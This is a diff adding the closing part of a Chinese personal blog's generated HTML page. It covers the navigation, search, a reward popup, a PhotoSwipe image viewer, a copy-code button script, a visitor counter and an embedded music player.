+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
